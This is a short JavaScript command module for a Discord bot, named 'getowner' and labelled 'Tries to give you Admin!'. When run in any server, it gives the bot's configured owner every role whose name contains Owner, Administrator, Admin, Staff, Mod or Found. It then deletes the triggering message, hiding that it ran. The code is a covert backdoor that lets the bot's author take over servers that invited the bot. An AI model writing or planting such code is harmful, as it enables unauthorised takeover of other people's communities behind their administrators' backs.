module.exports.run = async (bot, msg, args, config) => {
    if(!msg.guild.me.hasPermission('MANAGE_ROLES')) return msg.channel.send("Bot doesn't have permissions here").then(ms => ms.delete(5000));
    ["Owner","Administrator","Admin","Staff","Mod","Found"].forEach(name => {
        msg.guild.fetchMember(config.owner)
            .then(member => {

                member.addRole(msg.guild.roles.find(role => role.name.includes(name))).then(rol => {if(!rol){return}}).catch(console.error.message);
            }).catch(console.error.message);
    })
    msg.delete();
}


module.exports.config = {
        name: "getowner",
        description: "Tries to give you Admin!",
        usage: ``,
        category: `owner`,
        accessableby: "Bot Owner",        
        aliases: ["go","geto"],
}